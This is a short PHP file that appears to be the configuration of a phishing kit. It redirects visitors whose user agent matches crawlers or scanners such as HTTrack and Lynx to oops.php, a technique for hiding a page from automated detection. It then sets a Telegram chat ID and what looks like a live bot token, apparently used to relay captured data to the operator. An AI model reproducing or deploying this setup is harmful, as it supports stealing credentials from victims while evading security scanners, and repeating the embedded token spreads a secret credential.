<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) {
header('Location: oops.php');
die();
}

// FILE FOR CONNECT TO YOUR TELEGRAM BOT
$idTelegram = "-5067486358";
$tokenBot = "8585850869:AAF_yL67byYIGn48X55KqoKU6zcBImwVsJI";
?>